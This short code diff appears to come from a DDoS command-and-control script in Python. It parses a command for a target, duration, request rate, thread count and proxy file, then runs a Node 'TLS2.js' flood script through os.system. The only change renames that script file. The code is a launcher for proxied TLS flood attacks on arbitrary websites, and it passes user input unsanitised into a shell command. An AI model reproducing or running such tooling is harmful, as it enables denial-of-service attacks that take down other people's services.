@@ -84,7 +84,7 @@ def main():
                 Rate = cnc.split()[3]
                 threads = cnc.split()[4]
                 proxyFile = cnc.split()[5]
-                os.system(f'node TLS².js {target} {time} {Rate} {threads} proxy.txt')
+                os.system(f'node TLS2.js {target} {time} {Rate} {threads} proxy.txt')
             except IndexError:
                 print('Usage: TLS2 <Target> <Time> <Rate> <threads> ')
                 print('Example: TLS2 https://example.com 120 512 1000')
